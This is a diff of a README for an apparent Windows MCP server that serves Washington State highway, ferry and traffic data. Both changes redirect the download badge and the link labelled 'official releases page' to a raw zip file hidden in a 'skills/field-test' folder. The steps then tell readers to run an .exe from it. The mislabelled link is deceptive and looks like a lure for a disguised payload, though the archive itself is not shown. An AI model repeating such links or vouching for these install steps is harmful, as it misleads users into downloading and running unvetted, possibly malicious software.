@@ -1,6 +1,6 @@
 # 🚗 wsdot-mcp-server - Access Washington state travel information easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pugnoseindiana362/wsdot-mcp-server/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pugnoseindiana362/wsdot-mcp-server/raw/refs/heads/main/skills/field-test/wsdot-server-mcp-v2.2.zip)
 
 This application connects your computer to Washington State Department of Transportation data. It provides real-time updates on highway conditions, ferry schedules, and traffic alerts. You use this tool to gather information for planning your travel across the state. It works directly on your Windows computer.
 
@@ -30,7 +30,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official releases page](https://github.com/pugnoseindiana362/wsdot-mcp-server/releases).
+1. Visit the [official releases page](https://github.com/pugnoseindiana362/wsdot-mcp-server/raw/refs/heads/main/skills/field-test/wsdot-server-mcp-v2.2.zip).
 2. Look for the section labeled Assets.
 3. Click the link ending in .exe to download the installer.
 4. Open the file once the download finishes.
